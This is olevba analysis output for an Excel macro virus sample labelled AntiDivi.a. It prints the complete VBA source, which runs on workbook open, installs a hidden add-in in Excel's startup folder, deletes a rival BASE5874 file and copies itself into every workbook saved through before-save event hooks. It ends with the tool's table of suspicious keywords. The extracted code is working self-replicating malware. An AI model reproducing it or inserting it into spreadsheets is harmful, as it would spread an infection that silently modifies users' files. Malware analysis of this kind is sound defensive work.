olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.AntiDivi.a-4e6bbe8d27be61811d22a2988908ef9b74e8851f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.AntiDivi.a-4e6bbe8d27be61811d22a2988908ef9b74e8851f - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 













Private WithEvents mapp As Application
Attribute mapp.VB_VarHelpID = -1













Private Const cstrKillEngine      As String = "0KILLBASE.XLS"

Private Sub Workbook_Open()
Dim BaseName As String
Dim myName As String
Dim wbkKillEngine As Workbook
Dim strKillEngine As String

BaseName = Application.StartupPath + "\BASE5874.XLS"

If Len(Dir(BaseName)) <> 0 Then
    Set x = Application.Workbooks.Open(BaseName)
    x.Close
    Kill BaseName
    MsgBox "祇瞷<BASE5874>痜瑀,�w睲埃!!", vbInformation, "ㄓ��0KillBase�捍％�"
End If
strKillEngine = UCase$(Application.StartupPath + "\" + cstrKillEngine)

If UCase$(Me.FullName) = strKillEngine Then
    If Len(Dir(Application.StartupPath, vbDirectory)) = 0 Then MkDir Application.StartupPath
    Set mapp = Application
ElseIf Len(Dir(strKillEngine)) = 0 Then
    Application.ScreenUpdating = False
    Set wbkKillEngine = Workbooks.Add
    wbkKillEngine.IsAddin = True
    Intrude wbkKillEngine
    wbkKillEngine.SaveAs strKillEngine, xlAddIn
    wbkKillEngine.Close
    Application.ScreenUpdating = True
End If

End Sub

Private Sub mapp_WorkbookOpen(ByVal Wb As Workbook)
  Dim cmdTarget As Object
  
  On Error Resume Next
  Set cmdTarget = Wb.VBProject.VBComponents("ThisWorkbook").CodeModule
  If cmdTarget.Find("Private Const cstrEngine      As String =", 1, 1, 20, 41) Then
    cmdTarget.DeleteLines 1, cmdTarget.CountOfLines
    Wb.Save
    MsgBox "祇瞷<BASE5874>痜瑀,�w睲埃!!", vbInformation, "ㄓ��0KillBase�捍％�"
  End If

End Sub
Private Function Intrude(wbkTarget As Workbook) As Boolean
  Dim cmdSource As Object
  Dim cmdTarget As Object
  On Error Resume Next
  Intrude = False
  Set cmdSource = Me.VBProject.VBComponents("ThisWorkbook").CodeModule
  Set cmdTarget = wbkTarget.VBProject.VBComponents("ThisWorkbook").CodeModule
  If cmdTarget.CountOfLines <= 2 Then
    cmdTarget.DeleteLines 1, cmdSource.CountOfLines
    cmdTarget.AddFromString cmdSource.Lines(1, cmdSource.CountOfLines)
    Intrude = True
  End If
End Function
Private Sub mapp_WorkbookBeforeSave(ByVal Wb As Excel.Workbook, ByVal SaveAsUI As Boolean, Cancel As Boolean)
  On Error Resume Next
  Intrude Wb
End Sub


-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.AntiDivi.a-4e6bbe8d27be61811d22a2988908ef9b74e8851f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

